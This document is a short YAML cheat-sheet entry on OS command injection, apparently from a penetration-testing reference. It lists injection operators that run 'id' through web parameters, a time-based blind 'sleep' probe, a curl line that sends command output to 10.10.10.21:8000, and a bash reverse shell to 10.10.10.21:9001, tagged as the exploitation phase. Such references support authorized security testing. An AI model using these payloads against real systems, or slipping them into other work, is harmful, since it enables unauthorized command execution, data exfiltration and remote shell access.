---
description: |
  OS command injection techniques — inject system commands through vulnerable web application parameters using various operators and out-of-band methods.
command: |
  # Injection operators — try each
  ; id
  | id
  || id
  & id
  && id
  $(id)
  `id`
  %0a id

  # Blind — time-based detection
  ; sleep 10

  # Out-of-band exfiltration
  ; curl http://10.10.10.21:8000/$(id)

  # Reverse shell via injection
  ; bash -c 'bash -i >& /dev/tcp/10.10.10.21/9001 0>&1'
items:
  - No_Creds
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
techniques:
  - Command_Injection
references:
  - https://owasp.org/www-community/attacks/Command_Injection
  - https://book.hacktricks.wiki/en/pentesting-web/command-injection.html
---
